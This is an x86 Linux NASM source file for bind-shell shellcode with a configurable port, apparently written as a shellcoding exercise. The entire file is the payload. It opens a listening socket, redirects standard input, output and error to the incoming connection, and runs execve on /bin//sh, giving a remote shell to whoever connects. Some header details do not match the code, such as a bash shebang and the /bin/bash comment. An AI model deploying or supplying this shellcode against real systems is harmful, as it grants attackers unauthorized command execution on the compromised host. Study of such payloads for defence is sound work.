#!/bin/bash
#Filename: schema.nasm
#Author:  MrSquid
#Purpose: Bindshell.nasm code with port easily configurable 

global _start  

section .text

_start:
	;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	xor ebx,ebx ;Clearing out ebx
	mul ebx ; 
	push ebx ;push ebx to the stack 
	inc ebx ;increment in 1 ebx
	push ebx ; push ebx again to the stack
	push byte +0x2 ; Push 2 to the stack 
	mov ecx,esp ; 2 is set to ecx
	mov al,0x66 ; 102 is set to al 
	int 0x80 ;socket is executed --> eax
	
	;s.bind(('', port)) 
	pop ebx
	pop esi
	push edx
	push dword PORT ;Port selected to be used (replaced with the hexadecimal value of the port number) 
	push dword 0002
	push byte +0x10
	push ecx
	push eax
	mov ecx,esp
	push byte +0x66 
	pop eax
	int 0x80 ;socketcall is called 

	;s.listen(1) 
	mov [ecx+0x4],eax
	mov bl,0x4
	mov al,0x66
	int 0x80
	
	;(rem, addr) = s.accept()	
	inc ebx
	mov al,0x66
	int 0x80
	xchg eax,ebx
	pop ecx
	dup:
		push byte +0x3f ;63 en entero
		pop eax
		;os.dup2(rem.fileno(),0) #STDIN,STOUT,STDERR redirection 
	    	;os.dup2(rem.fileno(),1)
	    	;os.dup2(rem.fileno(),2)
		int 0x80
		dec ecx
		jns dup

	push dword 0x68732f2f ;pty.spawn("/bin/bash")
	push dword 0x6e69622f
	mov ebx,esp
	push eax
	push ebx
	mov ecx,esp
	mov al,0xb
	int 0x80 ;Shell is executed 

